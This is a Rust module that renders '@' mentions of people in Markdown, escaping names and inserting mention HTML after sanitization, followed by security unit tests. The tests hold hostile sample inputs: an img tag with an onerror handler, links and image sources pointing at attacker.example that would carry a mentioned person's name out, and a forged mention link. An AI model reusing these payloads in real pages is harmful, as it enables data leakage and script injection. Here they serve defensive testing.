//! Mentions of people in rendered text (S9, #360; ONTOLOGY §7.3, §14).
//!
//! `common::mention` reads the `@[label](person:id)` syntax for the API;
//! the API says who each mention may be named as (`MentionName`, which
//! rides on the text's own answer). This module shows them.
//!
//! **A mention is rendered only where Markdown reads a link.** The token
//! is link syntax, so the Markdown parser finds it: an `@` followed by a
//! link whose destination is `person:<id>`. It is replaced in the parsed
//! events, never in the source. (Putting HTML into the source put the
//! person's name wherever the token sat, a writer's own
//! `<a href='https://elsewhere/?q=@[x](person:…)'>` included: the name
//! then travelled to that address on a click. Found by the review of
//! #361's second half.) In code, in an HTML block, in an attribute, a
//! token is whatever Markdown makes of it there, and nobody is named.
//!
//! **The mention's HTML is put in after the sanitizer has run.** Where a
//! mention goes, the events carry a marker (two private-use characters
//! around a number), which the sanitizer passes as text;
//! [`Mentions::fill_html`] then puts the HTML there. So the sanitizer
//! allows none of the mention's classes, and a writer can't dress their
//! own link up as a mention.

use std::borrow::Cow;

use common::mention::{MentionName, html_inert, person_of_link};
use pulldown_cmark::{CowStr, Event, LinkType, Tag, TagEnd};

/// Around a mention's number in the events and the sanitized HTML.
/// Private-use characters: they mean nothing in text, and
/// [`without_markers`] takes them out of what a writer wrote.
const OPEN: char = '\u{e000}';
const CLOSE: char = '\u{e001}';

/// `source` without the two marker characters, so the only markers in a
/// rendering are the ones [`Mentions::mark`] put there.
pub fn without_markers(source: &str) -> Cow<'_, str> {
    if source.contains([OPEN, CLOSE]) {
        Cow::Owned(source.replace([OPEN, CLOSE], ""))
    } else {
        Cow::Borrowed(source)
    }
}

/// One mention as it is shown: as HTML, and as plain words (an outline).
struct Shown {
    html: String,
    plain: String,
}

impl Shown {
    /// - The reader's own person: a link to their page, with their
    ///   current name.
    /// - Someone else's person the reader may be told of: the current
    ///   name as plain text. No link, and no id in the markup: there is
    ///   no way into another account's People (§14).
    /// - Anyone else (no such person, not really mentioned here, or
    ///   their owner can no longer open the node): the label as it was
    ///   typed, marked unresolved.
    ///
    /// SECURITY: this HTML is not sanitized afterwards, so everything in
    /// it is written here: fixed tags, a canonical id, and the name with
    /// every character that is not a letter or a digit as a numeric
    /// entity (`html_inert`).
    fn of(person: common::id::PersonId, label: &str, people: &[MentionName]) -> Self {
        match people.iter().find(|p| p.person_id == person) {
            Some(named) if named.mine => {
                let plain = format!("@{}", named.display_name);
                Self {
                    html: format!(
                        r#"<a class="mention" href="/people/{}">{}</a>"#,
                        named.person_id.0.hyphenated(),
                        html_inert(&plain),
                    ),
                    plain,
                }
            }
            Some(named) => {
                let plain = format!("@{}", named.display_name);
                Self {
                    html: format!(r#"<span class="mention">{}</span>"#, html_inert(&plain)),
                    plain,
                }
            }
            None => {
                let plain = format!("@{}", label.trim());
                Self {
                    // Said in words too: not everyone sees the colour.
                    html: format!(
                        r#"<span class="mention-unresolved" title="Not linked to a person">{}</span>"#,
                        html_inert(&plain)
                    ),
                    plain,
                }
            }
        }
    }
}

/// The mentions of one rendering, in order.
pub struct Mentions {
    shown: Vec<Shown>,
}

impl Mentions {
    /// `events` with each mention replaced by a marker, and what to put
    /// at each marker.
    ///
    /// A mention is an inline link to `person:<id>` (the one spelling
    /// `common::mention` reads) that directly follows an `@`. Anything
    /// else is left as it is: a link to `person:…` without the `@` is an
    /// ordinary link, whose destination the sanitizer drops.
    pub fn mark<'a>(events: Vec<Event<'a>>, people: &[MentionName]) -> (Vec<Event<'a>>, Self) {
        let mut out: Vec<Event<'a>> = Vec::with_capacity(events.len());
        let mut shown = Vec::new();
        let mut events = events.into_iter().peekable();
        while let Some(event) = events.next() {
            let person = match &event {
                Event::Start(Tag::Link {
                    link_type: LinkType::Inline,
                    dest_url,
                    ..
                }) => person_of_link(dest_url),
                _ => None,
            };
            let after_at = matches!(out.last(), Some(Event::Text(text)) if text.ends_with('@'));
            let Some(person) = person.filter(|_| after_at) else {
                out.push(event);
                continue;
            };
            // The link's text is the label; whatever Markdown made of it
            // (emphasis, code) counts as its words.
            let mut label = String::new();
            for inner in events.by_ref() {
                match inner {
                    Event::End(TagEnd::Link) => break,
                    Event::Text(text) | Event::Code(text) => label.push_str(&text),
                    Event::SoftBreak | Event::HardBreak => label.push(' '),
                    _ => {}
                }
            }
            // The `@` belongs to the mention.
            if let Some(Event::Text(text)) = out.pop() {
                let before = text.strip_suffix('@').unwrap_or(&text);
                if !before.is_empty() {
                    out.push(Event::Text(CowStr::from(before.to_string())));
                }
            }
            out.push(Event::Text(CowStr::from(format!(
                "{OPEN}{}{CLOSE}",
                shown.len()
            ))));
            shown.push(Shown::of(person, &label, people));
        }
        (out, Self { shown })
    }

    fn fill(&self, text: &str, pick: impl Fn(&Shown) -> &str) -> String {
        let mut out = String::with_capacity(text.len());
        let mut rest = text;
        while let Some(open) = rest.find(OPEN) {
            out.push_str(rest.get(..open).unwrap_or_default());
            let after = rest.get(open + OPEN.len_utf8()..).unwrap_or_default();
            let Some(close) = after.find(CLOSE) else {
                rest = after;
                continue;
            };
            // A marker that is not one of ours can't be here
            // (`without_markers`); if it were, it is dropped.
            if let Some(shown) = after
                .get(..close)
                .and_then(|n| n.parse::<usize>().ok())
                .and_then(|n| self.shown.get(n))
            {
                out.push_str(pick(shown));
            }
            rest = after.get(close + CLOSE.len_utf8()..).unwrap_or_default();
        }
        out.push_str(rest);
        out
    }

    /// The sanitized HTML with each marker replaced by its mention.
    pub fn fill_html(&self, sanitized: &str) -> String {
        self.fill(sanitized, |shown| &shown.html)
    }

    /// Plain words (a heading's outline entry) with each marker replaced
    /// by "@name".
    pub fn fill_plain(&self, text: &str) -> String {
        self.fill(text, |shown| &shown.plain)
    }
}

#[cfg(test)]
mod tests {
    use crate::markdown::{render_body, render_markdown, render_markdown_plain, render_note};
    use common::id::{NodeId, PersonId};
    use common::mention::{MentionName, mention_token};
    use std::collections::HashMap;
    use uuid::Uuid;

    fn ada() -> PersonId {
        PersonId(Uuid::from_u128(0xada))
    }

    fn named(name: &str, mine: bool) -> Vec<MentionName> {
        vec![MentionName {
            person_id: ada(),
            display_name: name.to_string(),
            mine,
        }]
    }

    fn link() -> String {
        format!(
            r#"<a class="mention" href="/people/{}">"#,
            ada().0.hyphenated()
        )
    }

    #[test]
    fn a_mention_is_a_link_for_its_owner_and_a_name_for_anyone_else() {
        let text = format!("Met {}.", mention_token("Ada", ada()));
        // The current name, not the label.
        let own = render_note(&text, &named("Ada King", true));
        assert!(
            own.contains(&format!("Met {}&#64;Ada&#32;King</a>.", link())),
            "{own}"
        );
        let others = render_note(&text, &named("Ada King", false));
        assert!(
            others.contains(r#"Met <span class="mention">&#64;Ada&#32;King</span>."#),
            "{others}"
        );
        // SECURITY: nothing of the person but the name for another reader.
        assert!(!others.contains("href") && !others.contains(&ada().0.to_string()));
        // Nobody to name: the label as typed, unresolved, and said so.
        let nobody = render_note(&text, &[]);
        assert!(
            nobody.contains(
                r#"<span class="mention-unresolved" title="Not linked to a person">&#64;Ada</span>"#
            ),
            "{nobody}"
        );
        assert!(!nobody.contains(&ada().0.to_string()), "{nobody}");
    }

    #[test]
    fn a_name_is_never_markdown_or_markup() {
        let text = mention_token("x", ada());
        let hostile = "[click](https://evil.example) *b* <img src=x onerror=1> `c` \"q\" 'q' &amp;";
        for people in [named(hostile, true), named(hostile, false)] {
            let html = render_note(&text, &people);
            assert!(!html.contains("<img") && !html.contains("<em>"), "{html}");
            assert!(
                !html.contains("<code>") && !html.contains("onerror=1>"),
                "{html}"
            );
            assert_eq!(
                html.matches("href=").count(),
                usize::from(people[0].mine),
                "{html}"
            );
            assert!(html.contains("evil"), "the name is still shown: {html}");
        }
        // A label too (it is the writer's own text, and still inert).
        let token = format!("@[<b>*x*</b> y](person:{})", ada().0.hyphenated());
        let html = render_note(&token, &[]);
        assert!(!html.contains("<b>") && !html.contains("<em>"), "{html}");
    }

    /// SECURITY (from the review): a name goes only where Markdown reads
    /// a link. In a writer's own attribute it would travel to the
    /// writer's address on a click, or at once in an image's address.
    #[test]
    fn a_name_never_lands_in_a_writers_attribute_or_in_code() {
        let token = mention_token("x", ada());
        let secret = "Ada Secret";
        for text in [
            format!("<a href='https://attacker.example/?q={token}'>Quarterly report</a>"),
            format!("<img src='https://attacker.example/?{token}'>"),
            format!("<span title=\"{token}\">hover</span>"),
            format!("<!-- {token} -->"),
            format!("<div>\n{token}\n</div>"),
            format!("`{token}`"),
            format!("    {token}"),
            format!("```\n{token}\n```"),
            format!("[a link]({token})"),
            format!("![alt](https://attacker.example/{token})"),
        ] {
            for people in [named(secret, true), named(secret, false)] {
                for html in [
                    render_note(&text, &people),
                    render_markdown(&text, &HashMap::new(), &people),
                    render_body(&text, &HashMap::new(), &people).html,
                ] {
                    assert!(!html.contains("Secret"), "{text} -> {html}");
                    assert!(!html.contains("&#83;ecret"), "{text} -> {html}");
                }
            }
        }
    }

    /// A writer can't make their own link look like a mention: the
    /// mention's classes are not among those the sanitizer lets through.
    #[test]
    fn nobody_can_forge_the_look_of_a_mention() {
        let forged = render_note(
            r#"<a class="mention fixed inset-0" href="https://attacker.example/">@Ada King</a> <span class="mention etl-root">y</span> <span class="mention-unresolved">z</span>"#,
            &named("Ada King", true),
        );
        // The sanitizer empties the attribute; no class of any kind is left.
        for class in ["mention", "fixed", "inset-0", "etl-root"] {
            assert!(!forged.contains(class), "{class}: {forged}");
        }
        // Nor fake a marker of their own.
        let fake = render_note(
            "\u{e000}0\u{e001} and \u{e000}7\u{e001}",
            &named("Ada", true),
        );
        assert!(!fake.contains("mention") && !fake.contains("Ada"), "{fake}");
        let with_real = render_note(
            &format!("\u{e000}0\u{e001} {}", mention_token("Ada", ada())),
            &named("Ada", true),
        );
        assert_eq!(
            with_real.matches("class=\"mention\"").count(),
            1,
            "{with_real}"
        );
    }

    #[test]
    fn only_an_at_sign_and_a_person_link_together_are_a_mention() {
        let id = ada().0.hyphenated().to_string();
        let people = named("Ada", true);
        for not_one in [
            format!("[Ada](person:{id})"),
            format!("@ [Ada](person:{id})"),
            format!("@[Ada](person:{})", id.to_uppercase()),
            format!("@[Ada](people:{id})"),
            format!("@[Ada](https://example.com/person:{id})"),
            format!("@[Ada][ref]\n\n[ref]: person:{id}"),
            format!("@<person:{id}>"),
        ] {
            let html = render_note(&not_one, &people);
            assert!(!html.contains("class=\"mention"), "{not_one} -> {html}");
            // And a link to `person:` is dropped by the sanitizer.
            assert!(!html.contains("href=\"person:"), "{not_one} -> {html}");
        }
        // Several, and mixed with other things.
        let text = format!(
            "**{0}** then {0}, in a list:\n\n- {0}\n\n| a |\n|---|\n| {0} |\n",
            mention_token("Ada", ada())
        );
        let html = render_markdown(&text, &HashMap::new(), &people);
        assert_eq!(html.matches("class=\"mention\"").count(), 4, "{html}");
    }

    #[test]
    fn wiki_links_and_mentions_live_side_by_side() {
        let node = NodeId(Uuid::from_u128(7));
        let titles: HashMap<String, NodeId> = [("plan".to_string(), node)].into();
        let text = format!(
            "[[Plan]] with {} and [[Nowhere]]",
            mention_token("Ada", ada())
        );
        let html = render_markdown(&text, &titles, &named("Ada", true));
        assert!(
            html.contains(r#"<a class="wikilink" data-node-id="#),
            "{html}"
        );
        assert_eq!(html.matches("class=\"mention\"").count(), 1, "{html}");
        assert!(html.contains(r#"<span class="wikilink-unresolved">Nowhere</span>"#));
        // In a note, wiki links are text and the mention is a mention.
        let note = render_note(&text, &named("Ada", true));
        assert!(
            note.contains("[[Plan]] with <a class=\"mention\""),
            "{note}"
        );
    }

    #[test]
    fn a_heading_with_a_mention_reads_as_its_name_in_the_outline() {
        let text = format!(
            "## Ask {}\n\ntext\n\n## Two\n\n## Three\n",
            mention_token("Ada", ada())
        );
        let body = render_body(&text, &HashMap::new(), &named("Ada King", true));
        assert_eq!(body.outline[0].text, "Ask @Ada King");
        assert!(body.html.contains("class=\"mention\""), "{}", body.html);
        assert!(!body.html.contains('\u{e000}'), "{}", body.html);
    }

    /// Where no names are at hand (a Brief, a template, a task title),
    /// a token is a Markdown link with a scheme the sanitizer drops: it
    /// reads "@Ada", linked to nothing.
    #[test]
    fn a_token_that_is_not_resolved_reads_as_at_name_with_no_link() {
        let text = format!("Met {}.", mention_token("Ada", ada()));
        let html = render_markdown_plain(&text);
        assert!(html.contains("@<a") && html.contains(">Ada</a>"), "{html}");
        assert!(
            !html.contains("person:") && !html.contains("href"),
            "{html}"
        );
    }
}
